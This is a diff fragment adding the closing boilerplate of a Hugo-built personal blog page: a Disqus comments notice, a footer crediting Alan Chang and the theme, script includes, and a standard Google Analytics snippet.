+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a class="symbol" href="https://www.github.com/tcode2k16">
+        <i class="fa fa-github-square"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+       © Copyright 2018 <i class="fa fa-heart" aria-hidden="true"></i> Alan Chang
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://tcode2k16.github.io/blog/js/jquery-3.3.1.min.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/main.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-88069322-2', 'auto');
+ga('send', 'pageview');
+</script>
+
+
+
+
+
+    </body>
+</html>
